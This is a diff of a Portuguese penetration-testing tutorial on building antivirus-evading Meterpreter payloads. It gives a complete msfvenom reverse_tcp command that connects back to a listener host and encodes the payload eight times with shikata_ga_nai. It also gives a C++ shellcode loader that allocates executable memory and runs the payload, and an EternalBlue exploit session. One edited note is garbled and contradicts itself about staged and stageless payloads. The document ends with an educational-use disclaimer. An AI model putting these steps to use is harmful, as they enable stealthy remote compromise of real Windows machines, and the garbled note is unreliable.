@@ -11,17 +11,20 @@ Vamos criar shellcode com msfvenom, codificar, colar em um template personalizad
 
 ## Shellcode do Windows: x86 ou x64?
 
-Há alguns anos, era muito comum que binários x64 passassem despercebidos pelo Windows Defender, porém os produtos antivírus melhoraram muito recentemente e começaram a detectar cargas úteis de x64 meterpreter que testamos. Pouquíssimos codificadores suportam shellcode x64, o que reduz ainda mais nossa capacidade de criar cargas furtivas. Em nossos testes, descobrimos que construir cargas úteis x86 com o shikata_ga_nai resistiu ao maior teste do tempo e ainda consegue evitar a maioria dos motores AV.
+Há alguns anos, era muito comum que binários x64 passassem despercebidos pelo Windows Defender, porém os produtos antivírus melhoraram muito recentemente e começaram a detectar cargas úteis de x64 meterpreter que testamos. poucos codificadores suportam shellcode x64, o que reduz ainda mais nossa capacidade de criar cargas furtivas. Em nossos testes, descobrimos que construir cargas úteis x86 com o shikata_ga_nai resistiu ao maior teste do tempo e ainda consegue evitar a maioria dos motores AV.
 
-## Cargas úteis Meterpreter: qual delas?
+## Qual carga útil Meterpreter escolher?
 
-Você pode visualizar uma lista de cargas úteis executando , nós usaremos o **reverse_tpc** estagio Carga Útil: `msfvenom -l payloads`
+Você pode visualizar uma lista de cargas úteis executando , nós usaremos o **reverse_tcp** estagio Carga Útil: `msfvenom -l payloads`
 
 ```bash
 windows/meterpreter/reverse_tcp            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
 ```
 
->Nota: a carga útil selecionada `windows/meterpreter/reverse_tcp` é consideravelmente diferente da carga útil `windows/meterpreter_reverse_tcp`. A segunda indica que a carga útil está em estágio e se conectará de volta ao nosso manipulador para entregar toda a carga útil do meterpreter.
+>Nota: a carga útil selecionada `windows/meterpreter_reverse_tcp` é consideravelmente diferente da carga útil `windows/meterpreter/reverse_tcp`. A segunda indica que a segunda não está em estágio" (explicação invertida) e se conectará de volta ao nosso manipulador para entregar toda a carga útil do meterpreter
+
+- `windows/meterpreter/reverse_tcp` = **staged** (primeiro um stager pequeno, depois baixa o resto)
+- `windows/meterpreter_reverse_tcp` = **stageless** (payload completo em um único bloco)
 
 ## Shellcode Encoder
 
@@ -37,6 +40,8 @@ Agora usaremos o msfvenom para exportar o payload reverse_tcp como shellcode cod
 
 ```bash
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=9090 -e x86/shikata_ga_nai -i 8 -f c > shell.c
+
+# -i 8 = 8 iterações de codificação (recomendado: 5-15 para equilíbrio entre evasão e estabilidade)
 ```
 
 Na saída disso, nos interessamos pela linha, neste exemplo temos `557 bytes` no tamanho da carga útil:
@@ -80,7 +85,19 @@ Selecione o arquivo cpp e nomeie como “main.cpp”:
 No seu arquivo `main.cpp`, colaremos o seguinte código:
 
 ```
-#include <stdio.h>#include <windows.h>unsigned const char payload[] = "";size_t size = 0;int main(int argc, char** argv) {    char* code;    printf("This is just a random string!n");    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);    memcpy(code, payload, size);     ((void(*)())code)();    return(0);}
+#include <stdio.h>
+#include <windows.h>
+
+unsigned const char payload[] = "";
+size_t size = 0;
+
+int main(int argc, char** argv){
+    char* code;
+    printf("This is just a random string!\n");
+    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+    memcpy(code, payload, size);
+    ((void(*)())code)();
+    return(0);}
 ```
 
 ### Só precisamos mudar duas coisas:
@@ -145,3 +162,8 @@ RHOSTS => 10.0.0.30
 msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
 ```
 
+> O processo também funciona com VS 2022 (testado). 
+> Certifique-se de instalar a carga de trabalho "Desenvolvimento para desktop com C++".
+
+## ⚠️ Aviso Legal:
+Este conteúdo é exclusivamente para fins educacionais e testes de penetração com autorização prévia. O uso não autorizado é ilegal e de responsabilidade do usuário.
